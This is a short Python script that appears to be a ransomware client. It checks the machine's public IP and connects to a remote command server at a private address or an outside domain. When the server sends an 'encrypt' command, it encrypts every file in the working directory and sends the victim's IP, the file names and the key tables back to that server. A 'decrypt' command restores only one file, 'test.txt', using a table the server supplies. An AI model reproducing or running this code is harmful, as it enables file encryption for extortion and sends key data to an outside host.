
import os
import json
import requests
from pysocket import PySocketClient
from crypto import Crypto

ip = requests.get("http://ip.jsontest.com").json()["ip"]
host = "192.168.219.106" if ip == "125.182.224.34" else "http://m.moonsung.o-r.kr"
port = 8080

print(host)

ps = PySocketClient(host, port)
ct = Crypto()

def encrypt(server) :
    dir_path = "./"
    file_list = os.listdir(dir_path)
    table_list = []

    for file in file_list :
        result, table = ct.encrypt_file(dir_path + "/" + file)

        table_list.append(table)

    server.emit("data", json.dumps([{
        "ip" : ip,
        "file" : file_list[i],
        "table" : table_list[i]
    } for i in range(len(file_list))]))

def decrypt(server) :
    table = server.data[1:-1].split(",")

    for i in range(len(table)) :
        table[i] = int(table[i])

    result = ct.decrypt_file("test.txt", table)

ps.on("encrypt", encrypt)
ps.on("decrypt", decrypt)

ps.connect()